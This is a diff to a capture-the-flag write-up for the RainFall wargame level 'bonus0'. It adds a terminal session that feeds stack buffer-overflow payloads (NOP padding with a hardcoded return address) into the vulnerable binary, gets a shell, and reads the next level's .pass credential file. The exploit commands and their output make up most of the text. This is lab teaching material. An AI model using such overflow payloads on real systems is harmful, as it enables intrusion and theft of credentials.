@@ -186,7 +186,7 @@ first payload :
 <------------------>
 AAAAAAAAAAAAAAAAAAAA
 
-python -c 'print "A"*20 +'  > /tmp/first
+python -c 'print "A"*20'  > /tmp/first
 
 
 Second payload :
@@ -210,5 +210,15 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x93\xfe\xff\xbfA AAAAAAAAAAAAAA\x93\xfe\xff\x
 We wanted to put the shellcode (the second shellcode address at 54 --> the address of the return address):
 So we calculated with our previous schema how we can do to put this at the right place.
 
-
 (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+
+bonus0@RainFall:~$ python -c 'print "A"*20'  > /tmp/first
+bonus0@RainFall:~$ python -c 'print "\x90"*14 + "\x93\xfe\xff\xbf" + "\x90"' > /tmp/second
+bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAA??????????????????? ???????????????????
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
